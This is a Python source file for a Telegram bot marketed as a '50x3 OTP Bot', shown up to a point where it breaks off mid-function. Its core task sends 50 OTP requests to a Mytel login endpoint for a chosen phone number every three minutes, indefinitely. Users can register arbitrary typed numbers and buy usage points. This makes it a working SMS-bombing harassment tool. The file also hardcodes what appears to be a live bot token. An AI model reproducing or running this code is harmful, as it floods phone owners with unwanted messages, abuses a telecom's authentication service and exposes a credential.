import requests
import logging
import asyncio
import re
import sqlite3
import random
import string
from threading import Thread
from flask import Flask
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes, CallbackQueryHandler
)

# ------------------ Configuration ------------------
BOT_TOKEN = "8766340099:AAHtotYPQg84aOIN4iT0Pqr4nkbkvfPGeXo"
ADMIN_USER_ID = 1930138915  # Your numeric Telegram ID

# Health check server (keeps Render awake)
health_app = Flask(__name__)

@health_app.route('/')
def health():
    return "Bot is alive", 200

def run_health_server():
    health_app.run(host='0.0.0.0', port=8080)

Thread(target=run_health_server, daemon=True).start()

# API endpoint for OTP request
GET_OTP_URL = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Conversation states
WAITING_PHONE_SELECTION = 1
WAITING_CONTACT_ADD = 2
WAITING_LANGUAGE = 3
WAITING_PHONE_NUMBER_TYPED = 4

# ------------------ Translations ------------------
TEXTS = {
    'en': {
        'welcome': "👋 Welcome back!\nYou have {points} points.",
        'start_reg': "📱 *Welcome to 50x3 OTP Bot*\n\nTo start, please choose your language:",
        'lang_selected': "✅ Language set to English.\n\nNow please share your contact to register.",
        'contact_prompt': "📞 Please share your contact using the button below.\nThis will be your first phone number.",
        'contact_success': "✅ Registration successful!\nPhone: {phone}\n\nYou now have {points} points.\nReferral link: {link}\n\nYou can add up to 6 more phone numbers by simply typing them (e.g., 95912345678).\nTap *Start 50x3* to begin.",
        'phone_added': "✅ {msg}\n\nYou now have {count} phone number(s).",
        'phone_add_fail': "❌ {msg}",
        'add_phone_instruction': "📱 Please share your **new** phone number using the button below, or simply type the number (e.g., 95912345678).\nMaximum 7 numbers total.",
        'add_phone_cancel': "Addition cancelled.",
        'no_phones': "You have no phone numbers. Use the '➕ Add Phone' button or type a number to add one.",
        'select_phone': "Select a phone number:",
        'start_50x3': "⚡ Starting 50x3 OTP Service for {phone}\n\n• 50 OTP codes every 3 minutes\n• Daily reset at midnight\n• Use 'Stop Task' button to stop.\n\nFirst batch starting now...",
        'stop_task': "⏹️ Stopping all active tasks...",
        'my_phones': "📞 Your registered phone numbers:\n{list}\n\nTo remove: /removephone <index>",
        'points': "💰 Your points: {points}\n\nPoints ဝယ်ယူလိုပါက ADMIN @KOEKOE4 ထံဆက်သွယ်ပါ.\n\nInvite friends using your referral link to earn +10 points each!",
        'referral_link': "🔗 *Your referral link:*\n{link}\n\nShare it with friends! When they register, you get +10 points.",
        'help': "📖 *Help Menu*\n\n"
                "*50x3 Feature*\n"
                "• Sends 50 OTP codes every 3 minutes (180 sec).\n"
                "• Resets at midnight.\n"
                "• Runs until 'Stop Task'.\n\n"
                "*Points & Referral*\n"
                "• +10 points per referral.\n"
                "• Purchase points: contact @KOEKOE4.\n\n"
                "*Phone Management*\n"
                "• Up to 7 numbers.\n"
                "• First via contact sharing.\n"
                "• Additional numbers: type them directly.\n"
                "• Remove: /removephone <index>\n"
                "• List: 'My Phones' button.\n\n"
                "*Admin Panel* (admin only)",
        'admin_panel': "👑 *Admin Panel*\nChoose an action:",
        'admin_add': "Send user ID and points to add, e.g. `123456 10`",
        'admin_remove': "Send user ID and points to remove, e.g. `123456 5`",
        'admin_set': "Send user ID and new points, e.g. `123456 100`",
        'admin_done': "✅ {action} {points} points to/from user {target}.",
        'admin_list': "📊 *User List (points)*:\n{users}",
        'no_users': "No users.",
        'unknown': "Unknown command. Use the buttons below.",
        'forwarded_to_admin': "📨 Your message has been forwarded to admin.",
        'phone_invalid': "Invalid phone number. Please use format like 95912345678 (no spaces, +, or dashes).",
        'phone_limit': "You already have 7 phone numbers. Remove one first.",
        'phone_exists': "This phone number is already registered.",
        'already_registered': "You are already registered. Use the buttons below.",
    },
    'my': {
        'welcome': "👋 ပြန်လည်ကြိုဆိုပါတယ်။\nသင့်တွင် {points} ပွိုင့်ရှိသည်။",
        'start_reg': "📱 *50x3 OTP ဘော့သို့ ကြိုဆိုပါတယ်*\n\nစတင်ရန် သင့်ဘာသာစကားကို ရွေးပါ။",
        'lang_selected': "✅ မြန်မာဘာသာစကားကို ရွေးချယ်ပြီးပါပြီ။\n\nယခု စာရင်းသွင်းရန် သင့်ဖုန်းနံပါတ်ကို မျှဝေပါ။",
        'contact_prompt': "📞 ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို အောက်ပါခလုတ်ဖြင့် မျှဝေပါ။\n၎င်းသည် သင့်ပထမဆုံးဖုန်းနံပါတ်ဖြစ်လိမ့်မည်။",
        'contact_success': "✅ စာရင်းသွင်းခြင်း အောင်မြင်ပါသည်။\nဖုန်း: {phone}\n\nသင့်တွင် {points} ပွိုင့်ရှိသည်။\nရည်ညွှန်းလင့်: {link}\n\nနောက်ထပ် ဖုန်းနံပါတ် ၆ ခုအထိ ရိုက်ထည့်နိုင်ပါသည် (ဥပမာ 95912345678)။\n*Start 50x3* ကိုနှိပ်၍ စတင်ပါ။",
        'phone_added': "✅ {msg}\n\nယခုတွင် ဖုန်းနံပါတ် {count} ခုရှိသည်။",
        'phone_add_fail': "❌ {msg}",
        'add_phone_instruction': "📱 ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်အသစ်ကို မျှဝေရန် အောက်ပါခလုတ်ကိုနှိပ်ပါ သို့မဟုတ် နံပါတ်ကို ရိုက်ထည့်ပါ (ဥပမာ 95912345678)။\nစုစုပေါင်း ၇ ခုအထိ ထည့်နိုင်သည်။",
        'add_phone_cancel': "ဖျက်သိမ်းပြီးပါပြီ။",
        'no_phones': "သင့်တွင် ဖုန်းနံပါတ်မရှိပါ။ '➕ Add Phone' ခလုတ်ကိုနှိပ်ပါ သို့မဟုတ် နံပါတ်တစ်ခုရိုက်ထည့်ပါ။",
        'select_phone': "ဖုန်းနံပါတ်တစ်ခုကို ရွေးပါ:",
        'start_50x3': "⚡ {phone} အတွက် 50x3 OTP ဝန်ဆောင်မှု စတင်ပါပြီ။\n\n• ၃ မိနစ်တိုင်း OTP ၅၀ ပို့မည်။\n• သန်းခေါင်တွင် နေ့စဉ်ပြန်လည်စတင်မည်။\n• 'Stop Task' ခလုတ်ဖြင့် ရပ်နိုင်သည်။\n\nပထမအသုတ် စတင်နေပါပြီ...",
        'stop_task': "⏹️ လုပ်ဆောင်ချက်အားလုံးကို ရပ်တန့်နေပါသည်...",
        'my_phones': "📞 သင့်၏ မှတ်ပုံတင်ထားသော ဖုန်းနံပါတ်များ:\n{list}\n\nဖယ်ရှားရန်: /removephone <အမှတ်>",
        'points': "💰 သင့်ပွိုင့်များ: {points}\n\nပွိုင့်များဝယ်ယူလိုပါက ADMIN @KOEKOE4 ထံ ဆက်သွယ်ပါ။\n\nသင့်ရည်ညွှန်းလင့်ကို သူငယ်ချင်းများထံ မျှဝေပါ – သူတို့စာရင်းသွင်းတိုင်း ပွိုင့် ၁၀ ရမည်။",
        'referral_link': "🔗 *သင့်ရည်ညွှန်းလင့်:*\n{link}\n\nသူငယ်ချင်းများထံ မျှဝေပါ။ သူတို့စာရင်းသွင်းပါက ပွိုင့် ၁၀ ရမည်။",
        'help': "📖 *အကူညီမီနူး*\n\n"
                "*50x3 အင်္ဂါရပ်*\n"
                "• ၃ မိနစ်တိုင်း OTP ၅၀ ပို့သည်။\n"
                "• သန်းခေါင်တွင် နေ့စဉ်ပြန်လည်စတင်သည်။\n"
                "• 'Stop Task' မနှိပ်မချင်း ဆက်လက်လုပ်ဆောင်သည်။\n\n"
                "*ပွိုင့်နှင့် ရည်ညွှန်း*\n"
                "• ရည်ညွှန်းတစ်ခုလျှင် +၁၀ ပွိုင့်။\n"
                "• ပွိုင့်ဝယ်ယူရန် @KOEKOE4 ကို ဆက်သွယ်ပါ။\n\n"
                "*ဖုန်းနံပါတ် စီမံခန့်ခွဲမှု*\n"
                "• အများဆုံး ၇ ခုအထိ။\n"
                "• ပထမတစ်ခုကို အဆက်အသွယ်မျှဝေခြင်းဖြင့် ထည့်ရမည်။\n"
                "• ကျန်နံပါတ်များကို ရိုက်ထည့်နိုင်သည်။\n"
                "• ဖယ်ရှားရန်: /removephone <အမှတ်>\n"
                "• စာရင်းကြည့်ရန် 'My Phones' ခလုတ်။\n\n"
                "*အက်ဒမင် ဘောင်း* (အက်ဒမင်အတွက်သာ)",
        'admin_panel': "👑 *အက်ဒမင် ဘောင်း*\nလုပ်ဆောင်ချက်တစ်ခုကို ရွေးပါ:",
        'admin_add': "အသုံးပြုသူ ID နှင့် ထည့်ရန်ပွိုင့်ကို ပေးပို့ပါ။ ဥပမာ `123456 10`",
        'admin_remove': "အသုံးပြုသူ ID နှင့် ဖယ်ရှားရန်ပွိုင့်ကို ပေးပို့ပါ။ ဥပမာ `123456 5`",
        'admin_set': "အသုံးပြုသူ ID နှင့် ပွိုင့်အသစ်ကို ပေးပို့ပါ။ ဥပမာ `123456 100`",
        'admin_done': "✅ {action} {points} ပွိုင့် {target} အတွက် ပြီးပါပြီ။",
        'admin_list': "📊 *အသုံးပြုသူစာရင်း (ပွိုင့်)*:\n{users}",
        'no_users': "အသုံးပြုသူမရှိသေးပါ။",
        'unknown': "မသိသော command ဖြစ်သည်။ အောက်ပါခလုတ်များကို သုံးပါ။",
        'forwarded_to_admin': "📨 သင့်စာကို အက်ဒမင်ထံ ပေးပို့ပြီးပါပြီ။",
        'phone_invalid': "ဖုန်းနံပါတ်မမှန်ကန်ပါ။ 95912345678 ပုံစံဖြင့် ရိုက်ထည့်ပါ။",
        'phone_limit': "သင့်တွင် ဖုန်းနံပါတ် ၇ ခု ရှိပြီးဖြစ်သည်။ ဦးစွာဖယ်ရှားပါ။",
        'phone_exists': "ဤဖုန်းနံပါတ်ကို မှတ်ပုံတင်ထားပြီးသားဖြစ်သည်။",
        'already_registered': "သင့်အနေဖြင့် စာရင်းသွင်းပြီးသားဖြစ်သည်။ အောက်ပါခလုတ်များကို သုံးပါ။",
    }
}

# ------------------ Database Setup ------------------
DB_PATH = "otp_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER UNIQUE,
        username TEXT,
        first_name TEXT,
        points INTEGER DEFAULT 0,
        referral_code TEXT UNIQUE,
        referrer_id INTEGER,
        registered_at TIMESTAMP,
        language TEXT DEFAULT 'en'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_phones (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        phone_number TEXT,
        added_at TIMESTAMP,
        UNIQUE(user_id, phone_number)
    )''')
    conn.commit()
    conn.close()

init_db()

def generate_referral_code():
    return "ref_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def register_user(user_id, username, first_name, language, referrer_code=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone():
        conn.close()
        return False
    referral_code = generate_referral_code()
    referrer_id = None
    if referrer_code:
        c.execute("SELECT user_id FROM users WHERE referral_code = ?", (referrer_code,))
        row = c.fetchone()
        if row:
            referrer_id = row[0]
            c.execute("UPDATE users SET points = points + 10 WHERE user_id = ?", (referrer_id,))
    c.execute("INSERT INTO users (user_id, username, first_name, referral_code, referrer_id, registered_at, language) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (user_id, username, first_name, referral_code, referrer_id, datetime.now(), language))
    conn.commit()
    conn.close()
    return True

def is_registered(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone() is not None
    conn.close()
    return exists

def get_user_language(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'en'

def set_user_language(user_id, lang):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_user_phones(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT phone_number FROM user_phones WHERE user_id = ? ORDER BY added_at", (user_id,))
    phones = [row[0] for row in c.fetchall()]
    conn.close()
    return phones

def add_user_phone(user_id, phone_number):
    phones = get_user_phones(user_id)
    if len(phones) >= 7:
        return False, "phone_limit"
    if phone_number in phones:
        return False, "phone_exists"
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO user_phones (user_id, phone_number, added_at) VALUES (?, ?, ?)",
              (user_id, phone_number, datetime.now()))
    conn.commit()
    conn.close()
    return True, "phone_added"

def remove_user_phone(user_id, index):
    phones = get_user_phones(user_id)
    if index < 1 or index > len(phones):
        return False, "Invalid index."
    phone = phones[index-1]
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM user_phones WHERE user_id = ? AND phone_number = ?", (user_id, phone))
    conn.commit()
    conn.close()
    return True, f"Removed {phone}."

def get_points(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def update_points(user_id, delta):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (delta, user_id))
    conn.commit()
    conn.close()

def set_points(user_id, new_points):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET points = ? WHERE user_id = ?", (new_points, user_id))
    conn.commit()
    conn.close()

def get_referral_link(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT referral_code FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        bot_username = BOT_TOKEN.split(':')[0]  # This is not the username; need to get actual bot username.
        # Since we don't have bot username, use a placeholder: the bot's numeric ID? Actually we can fetch bot info.
        # But easier: we can just use the bot token's first part (the numeric ID) which works for deep linking.
        return f"https://t.me/{bot_username}?start={row[0]}"
    return None

def get_bot_username():
    # Fallback: use the numeric part of token as the bot's username? That doesn't work.
    # We'll ask the user to set the bot's username manually in config, or we can fetch via getMe.
    # For now, we'll use a placeholder: the bot's ID. But deep linking requires username.
    # Better to fetch at runtime. We'll do that once.
    global BOT_USERNAME
    if not BOT_USERNAME:
        try:
            import requests
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe")
            if resp.status_code == 200:
                BOT_USERNAME = resp.json()['result']['username']
            else:
                BOT_USERNAME = "your_bot_username"  # fallback
        except:
            BOT_USERNAME = "your_bot_username"
    return BOT_USERNAME

BOT_USERNAME = None

# ------------------ API Functions ------------------
async def request_otp(phone_number: str) -> tuple[bool, str]:
    params = {"phoneNumber": phone_number}
    try:
        resp = requests.get(GET_OTP_URL, params=params, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            return True, "✅ OTP request sent successfully. Check your SMS."
        else:
            return False, f"❌ Failed (HTTP {resp.status_code}): {resp.text[:100]}"
    except Exception as e:
        logger.exception("request_otp error")
        return False, f"❌ Network error: {str(e)}"

# ------------------ Keyboards ------------------
def language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English", callback_data="lang_en")],
        [InlineKeyboardButton("မြန်မာ", callback_data="lang_my")]
    ]
    return InlineKeyboardMarkup(keyboard)

def registration_keyboard(lang):
    button = KeyboardButton(TEXTS[lang]['contact_prompt'].split('\n')[0], request_contact=True)
    return ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)

def main_keyboard(user_id):
    lang = get_user_language(user_id)
    is_admin = (user_id == ADMIN_USER_ID)
    buttons = [
        [TEXTS[lang]['start_50x3'].split('\n')[0]],  # "⚡ Start 50x3 (50 codes/3min)" in respective language
        [TEXTS[lang]['my_phones'].split('\n')[0], TEXTS[lang]['add_phone_instruction'].split('\n')[0]],
        [TEXTS[lang]['referral_link'].split('\n')[0], TEXTS[lang]['points'].split('\n')[0]],
        [TEXTS[lang]['help'].split('\n')[0], TEXTS[lang]['stop_task']]
    ]
    if is_admin:
        buttons.append(["👑 Admin Panel"])
    # Translate button texts to actual strings without placeholders
    # We'll create a mapping for button labels:
    button_labels = {
        'en': {
            'start': "⚡ Start 50x3 (50 codes/3min)",
            'my_phones': "📞 My Phones",
            'add_phone': "➕ Add Phone via Contact",
            'referral': "🔗 Referral Link",
            'points': "💰 My Points",
            'help': "❓ Help",
            'stop': "🛑 Stop Task",
            'admin': "👑 Admin Panel"
        },
        'my': {
            'start': "⚡ Start 50x3 (50 codes/3min)",
            'my_phones': "📞 ကျွန်ုပ်၏ဖုန်းများ",
            'add_phone': "➕ ဖုန်းနံပါတ်ထည့်ရန်",
            'referral': "🔗 ရည်ညွှန်းလင့်",
            'points': "💰 ကျွန်ုပ်၏ပွိုင့်များ",
            'help': "❓ အကူညီ",
            'stop': "🛑 လုပ်ဆောင်ချက်ရပ်ရန်",
            'admin': "👑 အက်ဒမင် ဘောင်း"
        }
    }
    btns = button_labels[lang]
    buttons = [
        [btns['start']],
        [btns['my_phones'], btns['add_phone']],
        [btns['referral'], btns['points']],
        [btns['help'], btns['stop']]
    ]
    if is_admin:
        buttons.append([btns['admin']])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def contact_addition_keyboard(lang):
    button = KeyboardButton(TEXTS[lang]['add_phone_instruction'].split('\n')[0], request_contact=True)
    return ReplyKeyboardMarkup([[button], ["❌ Cancel"]], resize_keyboard=True, one_time_keyboard=True)

def phone_selection_keyboard(phones, lang):
    buttons = [[phone] for phone in phones]
    buttons.append([TEXTS[lang]['add_phone_cancel']])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True, one_time_keyboard=True)

def admin_inline_keyboard(lang):
    keyboard = [
        [InlineKeyboardButton(TEXTS[lang]['admin_add'].split('\n')[0], callback_data="admin_addpoints")],
        [InlineKeyboardButton(TEXTS[lang]['admin_remove'].split('\n')[0], callback_data="admin_removepoints")],
        [InlineKeyboardButton(TEXTS[lang]['admin_set'].split('\n')[0], callback_data="admin_setpoints")],
        [InlineKeyboardButton(TEXTS[lang]['admin_list'].split('\n')[0], callback_data="admin_listusers")],
        [InlineKeyboardButton("🔙 Close", callback_data="admin_close")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ------------------ Background Task (50x3) ------------------
async def run_fifty_x_three_otp(user_id: int, phone: str, context: ContextTypes.DEFAULT_TYPE):
    total_per_cycle = 50
    cycle_interval = 180
    current_date = datetime.now().date()
    total_sent = 0
    cycle_count = 0

    while not context.user_data.get("stop_task_flag"):
        now = datetime.now()
        if now.date() != current_date:
            current_date = now.date()
            total_sent = 0
            cycle_count = 0
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🔄 Daily reset! Fresh 50x3 cycle for {phone}"
            )

        cycle_count += 1
        await context.bot.send_message(
            chat_id=user_id,
            text=f"📦 Cycle #{cycle_count} - Sending {total_per_cycle} OTP codes for {phone}..."
        )

        for i in range(1, total_per_cycle + 1):
            if context.user_data.get("stop_task_flag"):
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🛑 50x3 stopped. Total sent today: {total_sent}"
                )
                return

            success, msg = await request_otp(phone)
            total_sent += 1
            status = "✅" if success else "❌"
            if i % 10 == 0 or i == total_per_cycle:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"{status} OTP #{i}/{total_per_cycle} (cycle #{cycle_count}) | Total today: {total_sent}\n{msg}"
                )
            else:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"{status} OTP #{i} for {phone}"
                )
            await asyncio.sleep(1)

        await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ Cycle #{cycle_count} completed. Next cycle in 3 minutes."
        )

        for _ in range(cycle_interval):
            if context.user_data.get("stop_task_flag"):
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🛑 50x3 stopped. Total sent today: {total_sent}"
                )
                return
            await asyncio.sleep(1)

# ------------------ Helper: forward message to admin ------------------
async def forward_to_admin(context: ContextTypes.DEFAULT_TYPE, user_id, text):
    try:
        user = await context.bot.get_chat(user_id)
        name = user.first_name
        username = user.username or "No username"
        msg = f"📩 *Message from user*\nID: `{user_id}`\nName: {name}\nUsername: @{username}\n\nMessage:\n{text}"
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed to forward to admin: {e}")

# ------------------ Handlers ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_registered(user_id):
        lang = get_user_language(user_id)
        points = get_points(user_id)
        await update.message.reply_text(
            TEXTS[lang]['welcome'].format(points=points),
            reply_markup=main_keyboard(user_id)
        )
        return

    # Not registered: ask for language
    await update.message.reply_text(
        "📱 *Welcome to 50x3 OTP Bot*\n\nPlease choose your language / ကျေးဇူးပြု၍ သင့်ဘာသာစကားကို ရွေးချယ်ပါ:",
        reply_markup=language_keyboard(),
        parse_mode="Markdown"
    )
    return WAITING_LANGUAGE

async def language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "lang_en":
        lang = 'en'
    elif data == "lang_my":
        lang = 'my'
    else:
        return
    user_id = update.effective_user.id
    # Store language temporarily in context
    context.user_data['temp_lang'] = lang
    await query.edit_message_text(
        TEXTS[lang]['lang_selected'],
        parse_mode="Markdown"
    )
    # Now ask for contact
    await query.message.reply_text(
        TEXTS[lang]['contact_prompt'],
        reply_markup=registration_keyboard(lang)
    )
    return WAITING_CONTACT_ADD

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("Please use the button to share your contact.")
        return

    user_id = update.effective_user.id
    phone = contact.phone_number
    phone = re.sub(r'^\+', '', phone)
    username = update.effective_user.username or "No username"
    first_name = update.effective_user.first_name

    # If user is not yet registered, we need to register first
    if not is_registered(user_id):
        # Language should be in temp
        lang = context.user_data.get('temp_lang', 'en')
        # Register user (without phone first)
        ref_code = None
        if context.args and len(context.args) > 0:
            ref_code = context.args[0]
        register_user(user_id, username, first_name, lang, ref_code)
        # Now add phone
        success, err_key = add_user_phone(user_id, phone)
        if success:
            # Notify admin
            await forward_to_admin(context, user_id, f"Registered with phone {phone}")
            points = get_points(user_id)
            link = get_referral_link(user_id)
            await update.message.reply_text(
                TEXTS[lang]['contact_success'].format(phone=phone, points=points, link=link),
                reply_markup=main_keyboard(user_id),
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(TEXTS[lang][err_key], reply_markup=registration_keyboard(lang))
    else:
        # Already registered: adding additional phone via contact
        lang = get_user_language(user_id)
        success, err_key = add_user_phone(user_id, phone)
        if success:
            await forward_to_admin(context, user_id, f"Added phone via contact: {phone}")
            count = len(get_user_phones(user_id))
            await update.message.reply_text(
                TEXTS[lang]['phone_added'].format(msg=TEXTS[lang]['phone_added'], count=count),
                reply_markup=main_keyboard(user_id)
            )
        else:
            await update.message.reply_text(TEXTS[lang][err_key], reply_markup=main_keyboard(user_id))

async def add_phone_contact_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("Please register first with /start", reply_markup=registration_keyboard('en'))
        return
    lang = get_user_language(user_id)
    await update.message.reply_text(
        TEXTS[lang]['add_phone_instruction'],
        reply_markup=contact_addition_keyboard(lang),
        parse_mode="Markdown"
    )
    return WAITING_CONTACT_ADD

async def typed_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user typing a phone number (e.g., 95912345678) to add as extra number."""
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("Please register first with /start")
        return
    lang = get_user_language(user_id)
    text = update.message.text.strip()
    # Validate phone number: digits only, starting with 959 or similar
    if not re.match(r'^[0-9]{9,12}$', text):
        await update.message.reply_text(TEXTS[lang]['phone_invalid'])
        return
    # Add phone number
    success, err_key = add_user_phone(user_id, text)
    if success:
        await forward_to_admin(context, user_id, f"Added phone number via typing: {text}")
        count = len(get_user_phones(user_id))
        await update.message.reply_text(
            TEXTS[lang]['phone_added'].format(msg=TEXTS[lang]['phone_added'], count=count),
            reply_markup=main_keyboard(user_id)
        )
    else:
        await update.message.reply_text(TEXTS[lang][err_key], reply_markup=main_keyboard(user_id))

async def cancel_addition(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    await update.message.reply_text(TEXTS[lang]['add_phone_cancel'], reply_markup=main_keyboard(user_id))
    return ConversationHandler.END

async def start_50x3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("Please register first with /start")
        return
    lang = get_user_language(user_id)
    phones = get_user_phones(user_id)
    if not phones:
        await update.message.reply_text(TEXTS[lang]['no_phones'])
        return

    if len(phones) == 1:
        phone = phones[0]
        await update.message.reply_text(
            TEXTS[lang]['start_50x3'].format(phone=phone),
            reply_markup=main_keyboard(user_id)
        )
        task = asyncio.create_task(run_fifty_x_three_otp(user_id, phone, context))
        context.user_data["active_task"] = task
        context.user_data["stop_task_flag"] = False
    else:
        await update.message.reply_text(
            TEXTS[lang]['select_phone'],
            reply_markup=phone_selection_keyboard(phones, lang)
        )
        return WAITING_PHONE_SELECTION

async def phone_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    if text == TEXTS[lang]['add_phone_cancel']:
        await update.message.reply_text(TEXTS[lang]['add_phone_cancel'], reply_markup=main_keyboard(user_id))
        return ConversationHandler.END

    phones = get_user_phones(user_id)
    if text not in phones:
        await update.message.reply_text(TEXTS[lang]['phone_invalid'])
        return WAITING_PHONE_SELECTION

    phone = text
    await update.message.reply_text(
        TEXTS[lang]['start_50x3'].format(phone=phone),
        reply_markup=main_keyboard(user_id)
    )
    task = asyncio.create_task(run_fifty_x_three_otp(user_id, phone, context))
    context.user_data["active_task"] = task
    context.user_data["stop_task_flag"] = False
    return ConversationHandler.END

async def stop_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    context.user_data["stop_task_flag"] = True
    await update.message.reply_text(TEXTS[lang]['stop_task'], reply_markup=main_keyboard(user_id))

async def my_phones(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    phones = get_user_phones(user_id)
    if not phones:
        await update.message.reply_text(TEXTS[lang]['no_phones'])
        return
    phone_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(phones)])
    await update.message.reply_text(TEXTS[lang]['my_phones'].format(list=phone_list))

async def my_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    points = get_points(user_id)
    await update.message.reply_text(TEXTS[lang]['points'].format(points=points))

async def referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    link = get_referral_link(user_id)
    if not link:
        await update.message.reply_text("Error generating link.")
        return
    # Create shareable URL
    share_url = f"https://t.me/share/url?url={link.replace(':', '%3A').replace('/', '%2F')}"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Share Link", url=share_url)],
        [InlineKeyboardButton("👤 Contact Admin", url="https://t.me/KOEKOE4")]
    ])
    await update.message.reply_text(
        TEXTS[lang]['referral_link'].format(link=link),
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = get_user_language(user_id)
    await update.message.reply_text(
        TEXTS[lang]['help'],
        reply_markup=main_keyboard(user_id),
        parse_mode="Markdown"
    )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ You are not an admin.")
        return
    lang = get_user_language(user_id)
    await update.message.reply_text(
        TEXTS[lang]['admin_panel'],
        reply_markup=admin_inline_keyboard(lang),
        parse_mode="Markdown"
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await query.edit_message_text("⛔ Unauthorized.")
        return
    lang = get_user_language(user_id)
    if data == "admin_addpoints":
        await query.edit_message_text(TEXTS[lang]['admin_add'], parse_mode="Markdown")
        context.user_data["admin_action"] = "add"
    elif data == "admin_removepoints":
        await query.edit_message_text(TEXTS[lang]['admin_remove'], parse_mode="Markdown")
        context.user_data["admin_action"] = "remove"
    elif data == "admin_setpoints":
        await query.edit_message_text(TEXTS[lang]['admin_set'], parse_mode="Markdown")
        context.user_data["admin_action"] = "set"
    elif data == "admin_listusers":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, first_name, points FROM users ORDER BY points DESC LIMIT 50")
        rows = c.fetchall()
        conn.close()
        if not rows:
